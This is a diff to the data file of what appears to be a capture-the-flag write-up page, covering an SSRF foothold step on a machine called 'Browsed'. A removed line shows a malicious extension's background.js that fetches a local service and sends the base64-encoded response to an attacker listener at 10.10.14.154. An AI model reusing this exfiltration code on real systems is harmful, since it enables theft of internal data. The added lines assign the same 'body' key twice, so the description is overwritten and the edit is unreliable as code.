@@ -636,8 +636,9 @@
           {
             phase: "FOOTHOLD SSRF EXECUTION",
             title: "Configuring Service Worker & Catching Exfiltration",
-            body: "Crafted a malicious extension package containing a `manifest.json` and a `background.js` file. The background worker fetched `http://localhost:5000/`, base64-encoded the response body, and exfiltrated it back to my python listener.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM.png' alt='SSRF Listener' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM_2.png' alt='Listener Data' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "cat << 'EOF' > background.js\nfetch(\"http://localhost:5000/\")\n  .then(r => r.text())\n  .then(d => fetch(\"http://10.10.14.154:8000/?d=\" + btoa(d)));\nEOF"
+            body: "Crafted a malicious extension package containing a `manifest.json` and a `background.js` file. The background worker fetched `http://localhost:5000/`, base64-encoded the response body, and exfiltrated it back to my python listener.",
+            body: "<div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM.png' alt='SSRF Listener' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+
           },
           {
             phase: "FOOTHOLD PACKAGING",
